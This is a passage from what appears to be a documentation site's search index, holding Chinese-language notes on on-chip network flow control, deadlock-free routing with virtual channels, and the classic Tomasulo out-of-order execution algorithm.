u4e0a\u200b\u7684\u200b\u6d88\u606f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u5360\u200b\u4e0d\u6ee1\u200b\u94fe\u8def\u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u6d6a\u8d39\u200b\u3002\u200b\u4f46\u662f\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u6548\u7387\u200b\u6bd4\u8f83\u200b\u9ad8\u200b\uff1a\u200b\u6ca1\u6709\u200b\u5206\u7247\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u91cf\u200b\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5206\u644a\u200b\u5efa\u7acb\u200b\u9636\u6bb5\u200b\u7684\u200b\u5f00\u9500\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u4e2a\u200b\u6d41\u63a7\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\uff08Store and Forward\uff09\uff1a\u200b\u628a\u200b\u6536\u5230\u200b\u7684\u200b Packet \u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u6bcf\u4e2a\u200b Packet \u200b\u7684\u200b\u76ee\u7684\u5730\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u65b9\u5411\u200b\uff0c\u200b\u7136\u540e\u200b\u53d1\u9001\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u200b\u91cc\u200b\u5f88\u200b\u5e38\u89c1\u200b\uff0c\u200b\u4f46\u662f\u200b\u7f3a\u70b9\u200b\u662f\u200b\u5ef6\u8fdf\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002\u200b\u5728\u200b\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u6709\u200b\u4e24\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u4e00\u662f\u200b\u7684\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u5ef6\u8fdf\u200b\u65e0\u6cd5\u200b\u5ffd\u7565\u200b\uff0c\u200b\u4e8c\u662f\u200b\u9700\u8981\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u6765\u200b\u4fdd\u5b58\u200b Packet\u3002</p> <p>\u200b\u5728\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\uff08Virtual Cut-through\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u6536\u5230\u200b Packet \u200b\u5934\u90e8\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u4e86\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u628a\u200b Packet \u200b\u62c6\u6210\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5355\u4f4d\u200b\uff0c\u200b\u79f0\u4e3a\u200b Flit\uff08Flow control unit/Flow control digit\uff09\u3002\u200b\u628a\u200b\u4e00\u4e2a\u200b Packet \u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b Flit \u200b\u4ee5\u540e\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u63a5\u6536\u200b\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b Flit \u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u540c\u6b65\u200b\u53d1\u9001\u200b\u7b2c\u4e00\u4e2a\u200b Flit\uff1b\u200b\u63a5\u6536\u200b\u5230\u200b\u7b2c\u4e09\u4e2a\u200b Flit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u540c\u6b65\u200b\u53d1\u9001\u200b\u7b2c\u4e8c\u4e2a\u200b Flit\uff0c\u200b\u4f9d\u6b64\u7c7b\u63a8\u200b\u3002\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u7684\u200b\u7f13\u5b58\u200b\u53ef\u4ee5\u200b\u653e\u5f97\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Packet\u3002\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u4e2a\u200b Flit \u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u8def\u7531\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\u7f13\u89e3\u200b\u4e86\u200b\u5b58\u50a8\u8f6c\u53d1\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u95ee\u9898\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u89e3\u51b3\u200b\u7b2c\u4e8c\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u7f13\u51b2\u533a\u200b\u5927\u5c0f\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b\uff08Wormhole\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u7f13\u51b2\u533a\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u5b8c\u6574\u200b\u7684\u200b Packet\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u80fd\u653e\u5f97\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Flit\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u50cf\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\u90a3\u6837\u200b\u7ee7\u7eed\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b\u51fa\u73b0\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b Head of Line Blocking \u200b\u95ee\u9898\u200b\uff1a\u200b\u5f53\u200b\u7f13\u51b2\u533a\u200b\u6ee1\u200b\u4e86\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e00\u4e2a\u200b Packet \u200b\u7684\u200b\u591a\u4e2a\u200b Flit \u200b\u53ef\u80fd\u200b\u6563\u843d\u200b\u5728\u200b\u591a\u4e2a\u200b\u7ed3\u70b9\u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u56e0\u4e3a\u200b\u540c\u4e00\u4e2a\u200b Packet \u200b\u5835\u585e\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u4f20\u8f93\u200b\u5176\u4ed6\u200b\u6570\u636e\u200b\u3002\u200b\u6bd4\u8f83\u200b\u6781\u7aef\u200b\u7684\u200b\u60c5\u51b5\u200b\u662f\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b Packet \u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b Flit \u200b\u5df2\u7ecf\u200b\u5230\u8fbe\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u4f46\u662f\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b Flit \u200b\u8fd8\u200b\u5728\u200b\u8d77\u70b9\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u963b\u585e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u628a\u200b\u6574\u4e2a\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u5835\u4f4f\u200b\u3002\u200b\u865a\u62df\u200b\u76f4\u901a\u200b\uff08Virtual cut-through\uff09\u200b\u7b97\u6cd5\u200b\u5728\u200b\u51fa\u73b0\u200b\u963b\u585e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53d1\u9001\u200b\u65f6\u200b\u5df2\u7ecf\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u7f13\u51b2\u533a\u200b\u53ef\u4ee5\u200b\u653e\u4e0b\u200b\u6574\u4e2a\u200b Packet\uff0c\u200b\u56e0\u6b64\u200b\u5373\u4f7f\u200b\u51fa\u73b0\u200b\u4e86\u200b\u963b\u585e\u200b\uff0c\u200b\u90e8\u5206\u200b\u7ed3\u70b9\u200b\u8fd8\u662f\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u53d1\u9001\u200b Flit\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b Head of Line Blocking \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u865a\u62df\u200b\u901a\u9053\u200b\uff08Virtual Channel\uff09\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u65e2\u7136\u200b Block \u200b\u5728\u200b Head of Line \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u652f\u6301\u200b\u591a\u4e2a\u200b Line\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u591a\u4e2a\u200b Virtual Channel\u3002\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u8fd8\u662f\u200b\u539f\u6765\u200b\u7684\u200b\u901a\u9053\u200b\uff0c\u200b\u4f46\u662f\u200b\u903b\u8f91\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u591a\u4e2a\u200b Virtual Channel\u3002\u200b\u5728\u200b Packet \u200b\u8fdb\u5165\u200b\u7ed3\u70b9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPacket \u200b\u4f1a\u200b\u88ab\u200b\u5206\u5230\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b Virtual Channel \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b Packet \u200b\u5835\u585e\u200b\u4e86\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u5835\u4f4f\u200b\u5b83\u200b\u6240\u5728\u200b\u7684\u200b Virtual Channel\uff0c\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u4f20\u8f93\u200b\u3002\u200b\u591a\u4e2a\u200b Virtual Channel \u200b\u7ade\u4e89\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u901a\u9053\u200b\uff0c\u200b\u91c7\u7528\u200b\u8f6e\u8be2\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4ef2\u88c1\u200b\u3002</p> <p>Virtual Channel \u200b\u52a0\u4e0a\u200b Wormhole Routing \u200b\u662f\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\u7684\u200b\u6d41\u63a7\u200b\u7b97\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6d41\u63a7\u200b\u7b97\u6cd5\u200b\u7684\u200b\u603b\u7ed3\u200b\uff1a</p> \u200b\u94fe\u8def\u200b \u200b\u7f13\u5b58\u200b \u200b\u8bc4\u4ef7\u200b \u200b\u7535\u8def\u200b\u4ea4\u6362\u200b Message N/A (\u200b\u65e0\u200b\u7f13\u5b58\u200b) \u200b\u9700\u8981\u200b\u5efa\u7acb\u200b\u548c\u200b\u786e\u8ba4\u200b \u200b\u5b58\u50a8\u8f6c\u53d1\u200b Packet Packet \u200b\u6536\u5230\u200b\u5b8c\u6574\u200b Packet \u200b\u624d\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b \u200b\u865a\u62df\u200b\u76f4\u901a\u200b Packet Packet \u200b\u5934\u200b Flit \u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b \u200b\u866b\u200b\u5b54\u6d41\u63a7\u200b Packet Flit Head of Line Blocking \u200b\u865a\u62df\u200b\u901a\u9053\u200b Flit Flit \u200b\u4e0d\u540c\u200b\u6570\u636e\u5305\u200b\u7684\u200b\u6570\u636e\u200b\u7247\u200b\u4ea4\u9519\u200b <p>\u200b\u6765\u6e90\u200b\uff1a\u300a\u200b\u9ad8\u7b49\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u4ef6\u200b</p>"},{"location":"hardware/on_chip_networks.html#_6","title":"\u65e0\u200b\u6b7b\u9501\u200b\u6d41\u63a7","text":"<p>\u200b\u6b64\u5916\u200b\uff0cVirtual Channel \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u89e3\u51b3\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u5c31\u200b\u4e0d\u7528\u200b\u8003\u8651\u200b\u6b7b\u9501\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u800c\u662f\u200b\u7531\u200b Virtual Channel \u200b\u6765\u200b\u89e3\u51b3\u200b\u3002</p> <p>\u200b\u56de\u5fc6\u200b\u6b7b\u9501\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u6b7b\u9501\u200b\u662f\u56e0\u4e3a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5faa\u73af\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u7f13\u51b2\u533a\u200b\u90fd\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u65e0\u6cd5\u200b\u4f20\u8f93\u6570\u636e\u200b\u3002\u200b\u4e3a\u4e86\u200b\u523b\u753b\u51fa\u200b\u4f9d\u8d56\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ed8\u5236\u200b\u51fa\u200b Channel Dependency Graph\uff1a\u200b\u5982\u679c\u200b A \u200b\u5230\u200b B \u200b\u7684\u200b\u4f20\u8f93\u200b Channel \u200b\u4f9d\u8d56\u4e8e\u200b B \u200b\u5230\u200b C \u200b\u7684\u200b\u4f20\u8f93\u200b Channel\uff0c\u200b\u5c31\u200b\u4ece\u200b (A, B) \u200b\u753b\u200b\u4e00\u6761\u200b\u8fb9\u5230\u200b (B, C)\u3002\u200b\u6ce8\u610f\u200b\uff0c\u200b\u539f\u6765\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u62d3\u6251\u200b\u91cc\u200b\u7684\u200b\u8fb9\u200b\uff0c\u200b\u5728\u200b Channel Dependency Graph \u200b\u91cc\u200b\u53d8\u6210\u200b\u4e86\u200b\u70b9\u200b\u3002</p> <p>\u200b\u5f15\u5165\u200b Virtual Channel \u200b\u4ee5\u540e\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6bcf\u4e2a\u200b Virtual Channel \u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4ece\u200b A \u200b\u5230\u200b B \u200b\u7684\u200b\u94fe\u8def\u200b\u4e0a\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u6709\u200b\u4e86\u200b\u591a\u4e2a\u200b\u4f20\u8f93\u200b Channel\uff0c\u200b\u6bcf\u4e2a\u200b Virtual Channel \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u4f20\u8f93\u200b Channel\u3002\u200b\u867d\u7136\u200b\u7269\u7406\u200b\u4e0a\u200b\u8fd8\u662f\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u4f46\u662f\u200b\u4e00\u4e2a\u200b Virtual Channel \u200b\u5728\u200b\u963b\u585e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u7684\u200b\u5de5\u4f5c\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u4e0d\u6b62\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u5373\u4f7f\u200b\u4eba\u4e3a\u200b\u5730\u200b\u7981\u7528\u200b\u4e00\u4e2a\u200b Channel\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u6253\u7834\u200b\u4e86\u200b\u73af\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u56fe\u4e3a\u4f8b\u200b\uff1a\u200b\u4e0b\u56fe\u200b (a) \u200b\u5de6\u4fa7\u200b\u4e2d\u200b \\(n_1\\) \u200b\u5230\u200b \\(n_4\\) \u200b\u662f\u200b\u7ec4\u6210\u200b\u73af\u200b\u7684\u200b\u56db\u4e2a\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u56db\u4e2a\u200b Channel \u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u56e0\u6b64\u200b Channel Dependency Graph \u200b\u51fa\u73b0\u200b\u4e86\u200b\u73af\u200b\uff08\u200b\u4e0b\u56fe\u200b (a) \u200b\u53f3\u4fa7\u200b\uff09\uff1b\u200b\u5f15\u5165\u200b\u4e86\u200b Virtual Channel \u200b\u4ee5\u540e\u200b\uff0c\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\u4e24\u4e2a\u200b Channel\uff0c\u200b\u6b64\u65f6\u200b\u7981\u7528\u200b \\(c_{00}\\) \u200b\u901a\u9053\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7ea6\u5b9a\u200b Channel \u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u90a3\u4e48\u200b Channel Dependency Graph \u200b\u5c31\u200b\u4e0d\u518d\u200b\u6210\u73af\u200b\uff08\u200b\u4e0b\u56fe\u200b (b) \u200b\u53f3\u4fa7\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u7531\u4e8e\u200b\u6570\u636e\u200b\u4e0d\u4f1a\u200b\u7ed5\u200b\u7740\u200b\u73af\u8f6c\u200b\u4e24\u5708\u200b\uff0c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u53ef\u8fbe\u6027\u200b\u3002</p> <p> </p> \u200b\u4f7f\u7528\u200b Virtual Channel \u200b\u89e3\u51b3\u200b\u6b7b\u9501\u200b\u95ee\u9898\u200b\uff08\u200b\u56fe\u6e90\u200b Deadlock-Free Message Routing in Multiprocessor Interconnection Networks\uff09 <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u601d\u8def\u200b\u662f\u200b\u628a\u200b Virtual Channel \u200b\u5206\u6210\u200b\u4e24\u7c7b\u200b\uff0c\u200b\u7b2c\u4e00\u7c7b\u200b\u90fd\u200b\u91c7\u7528\u200b X-Y \u200b\u8def\u7531\u200b\uff0c\u200b\u7b2c\u4e8c\u7c7b\u200b\u90fd\u200b\u91c7\u7528\u200b Y-X \u200b\u8def\u7531\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u6b7b\u9501\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ec4\u5408\u200b\u591a\u79cd\u200b\u65e0\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b Escape Virtual Channel\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u5728\u200b\u591a\u4e2a\u200b Virtual Channel \u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b Virtual Channel\uff0c\u200b\u4f8b\u5982\u200b VC0 \u200b\u4e3a\u200b Escape Virtual Channel\u3002\u200b\u53ea\u6709\u200b VC0 \u200b\u5fc5\u987b\u200b\u91c7\u7528\u200b\u65e0\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4f8b\u5982\u200b X-Y \u200b\u8def\u7531\u200b\uff0c\u200b\u5176\u4ed6\u200b Virtual Channel \u200b\u53ef\u4ee5\u200b\u7528\u200b\u53ef\u80fd\u200b\u6b7b\u9501\u200b\u7684\u200b\u8def\u7531\u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_7","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>On-Chip Networks, Second Edition</li> </ul>"},{"location":"hardware/ooo_cpu.html","title":"\u4e71\u5e8f\u6267\u884c\u200b CPU","text":""},{"location":"hardware/ooo_cpu.html#tomasulo","title":"\u7ecf\u5178\u200b Tomasulo","text":"<p>\u200b\u53c2\u8003\u200b\u6559\u6750\u200b\uff1aBerkeley CS252\u3002</p> <p>\u200b\u7ecf\u5178\u200b Tomasulo\uff0c\u200b\u4e5f\u200b\u662f\u200b Wikipedia \u200b\u4e0a\u200b\u63cf\u8ff0\u200b\u7684\u200b Tomasulo \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u3002\u200b\u6307\u4ee4\u200b\u5728\u200b Decode \u200b\u4e4b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u88ab\u200b\u5206\u914d\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u3002\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u8fd9\u4e9b\u200b\u5c5e\u6027\u200b\uff1a</p> <ol> <li>Op\uff1a\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u7684\u200b\u64cd\u4f5c\u200b</li> <li>Qj\uff0cQk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u4f9d\u8d56\u200b\u7684\u200b\u6307\u4ee4\u200b\u76ee\u524d\u200b\u6240\u5728\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b ID</li> <li>Vj\uff0cQk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b</li> <li>Rj\uff0cRk\uff1a\u200b\u64cd\u4f5c\u6570\u200b\u662f\u5426\u200b ready\uff08\u200b\u6216\u8005\u200b\u7528\u200b\u7279\u6b8a\u200b\u7684\u200b Qj\uff0cQk \u200b\u503c\u200b\u8868\u793a\u200b\u662f\u5426\u200b ready\uff09</li> <li>Busy\uff1a\u200b\u8fd9\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u88ab\u200b\u5360\u7528\u200b</li> </ol> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b mapping\uff08Wikipedia \u200b\u4e0a\u200b\u53eb\u505a\u200b RegisterStat\uff09\uff0c\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u5bc4\u5b58\u5668\u200b\u662f\u5426\u200b\u4f1a\u200b\u88ab\u200b\u67d0\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u3002</p> <p>\u200b\u6307\u4ee4\u200b\u5206\u914d\u200b\u5230\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u67e5\u8be2\u200b RegisterStat\uff0c\u200b\u5f97\u77e5\u200b\u64cd\u4f5c\u6570\u200b\u5bc4\u5b58\u5668\u200b\u662f\u5426\u200b ready\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b ready\uff0c\u200b\u8bf4\u660e\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5148\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b ID\u3002\u200b\u5f53\u200b\u64cd\u4f5c\u6570\u200b\u90fd\u200b ready \u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u3002\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5728\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u4e2d\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u672a\u200b\u51fa\u73b0\u200b WAW \u200b\u65f6\u4f1a\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c\u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b Common Data Bus \u200b\u8fdb\u884c\u200b\u5e7f\u64ad\u200b\uff0c\u200b\u76ee\u524d\u200b\u5728\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5b83\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u521a\u597d\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b\u53d6\u503c\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u3002</p> <p>\u200b\u8fd9\u91cc\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7ec6\u8282\u200b\uff1a\u200b\u56e0\u4e3a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u7684\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u8981\u200b\u7b49\u5f85\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u5229\u7528\u7387\u200b\u66f4\u9ad8\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b\u8ba1\u7b97\u200b\u7c7b\u578b\u200b\uff08\u200b\u6bd4\u5982\u200b ALU\uff09\uff0c\u200b\u9700\u8981\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b\u540c\u7c7b\u200b\u7684\u200b\u4fdd\u7559\u200b\u7ad9\u200b\uff08\u200b\u6bd4\u5982\u200b Add1\uff0cAdd2\uff0cAdd3\uff09\u3002\u200b\u5728\u200b Wikipedia \u200b\u7684\u200b\u8868\u8ff0\u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6027\u80fd\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff0c\u200b\u4f46\u200b\u81ea\u7136\u200b\u9762\u79ef\u200b\u4e5f\u200b\u5c31\u200b\u66f4\u200b\u5927\u200b\u3002\u200b\u5982\u679c\u200b\u8282\u7701\u200b\u9762\u79ef\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4ece\u200b\u591a\u4e2a\u200b\u4fdd\u7559\u200b\u7ad9\u200b\u4e2d\u200b\u83b7\u53d6\u200b\u8ba1\u7b97\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p> 